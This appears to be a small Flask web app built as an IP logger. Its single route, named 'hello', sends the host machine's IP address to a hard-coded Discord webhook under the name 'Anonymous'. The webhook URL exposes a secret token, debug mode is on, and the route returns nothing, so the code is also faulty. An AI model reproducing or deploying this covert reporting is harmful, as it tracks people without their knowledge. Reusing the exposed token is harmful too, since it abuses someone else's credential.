from flask import Flask
import socket
import requests

app = Flask(__name__)

@app.route("/")
def hello():
    url = 'https://discord.com/api/webhooks/1181678412989997086/lgRtiPwRWvkGan3kBumk_Iyg1UFx8yFdYWulTOQnOzgsFsOEraagE_69OMwbpYskioxV'
    ip = socket.gethostbyname(socket.gethostname())
    msg = {
        "username": "Anonymous",
        "content": "Ip: "+ip
    }
    requests.post(url, json=msg)

    

if __name__ == "__main__":
    app.run(debug=True)
